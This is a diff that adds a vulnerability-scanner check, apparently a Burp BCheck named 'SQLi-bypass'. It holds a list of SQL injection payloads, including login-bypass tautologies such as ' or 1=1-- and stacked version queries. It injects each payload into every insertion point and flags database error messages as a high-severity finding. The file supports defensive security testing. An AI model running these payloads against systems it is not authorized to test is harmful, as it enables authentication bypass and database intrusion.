@@ -1,0 +1,71 @@
+metadata:
+    language: v1-beta
+    name: "SQLi-bypass"
+    description: "SQL injection (SQLi)"
+    author: "nu11secur1ty"
+    tags: "sqli"
+
+run for each:
+    payloads =
+        `nu11secur1ty' or 1=1#`,
+        `'`,
+        `"`,
+        ` or 1=1`,
+        `' or 1=1`,
+        `" or 1=1`,
+        ` or 1=1--`,
+        `' or 1=1--`,
+        `" or 1=1--`,
+        ` or 1=1-- -`,
+        `' or 1=1-- -`,
+        `" or 1=1-- -`,
+        `' or 'x'='x`,
+        `" or "x"="x`,
+        `') or 1=1--`,
+        `") or 1=1--`,
+        `') or 1=1-- -`,
+        `") or 1=1-- -`,
+        `') or ('x')=('x`,
+        `") or ("x")=("x`,
+        ` or true`,
+        `' or true`,
+        `" or true`,
+        ` or true--`,
+        `' or true--`,
+        `" or true--`,
+        ` or true-- -`,
+        `' or true-- -`,
+        `" or true-- -`,
+        `))`,
+        `'))`,
+        `"))`,
+        `))--`,
+        `'))--`,
+        `"))--`,
+        `))-- -`,
+        `'))-- -`,
+        `"))-- -`,
+        `;SELECT version()`,
+        `;SELECT @@version`,
+        `;SELECT version();`,
+        `;SELECT @@version;`,
+        `;SELECT version();--`,
+        `;SELECT @@version;--`
+
+given any insertion point then
+    send payload:
+        appending: {payloads}
+    
+    if "MySQL" in {latest.response} or
+       "SQL Server" in {latest.response} or
+       "PostgreSQL" in {latest.response} or
+       "Oracle" in {latest.response} or
+       "You have an error in your SQL syntax" in {latest.response} or
+       "SyntaxError" in {latest.response} or
+       "DatabaseError" in {latest.response} or
+       "ODBC Driver" in {latest.response} then
+        report issue:
+            severity: high
+            confidence: tentative
+            detail: "SQL injection (SQLi)"
+    end if
